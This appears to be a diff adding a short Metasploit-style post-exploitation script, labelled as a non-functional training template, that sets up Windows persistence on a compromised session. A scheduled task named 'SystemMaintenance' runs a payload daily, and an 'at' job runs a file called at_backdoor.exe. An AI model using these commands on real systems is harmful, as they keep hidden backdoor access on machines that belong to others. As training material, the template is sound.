@@ -1,0 +1,16 @@
+# Scheduled Task Persistence Template
+# For Training Use – Non-functional Template
+
+use post/windows/manage/schtask_persistence
+set SESSION 1
+set TASKNAME SystemMaintenance
+set REXEPATH /tmp/task.exe
+set TRIGGER_TYPE DAILY
+set TRIGGER_TIME 09:00
+run
+
+use post/windows/manage/at_persistence
+set SESSION 1
+set REXEPATH /tmp/at_backdoor.exe
+set TIME 12:00
+run
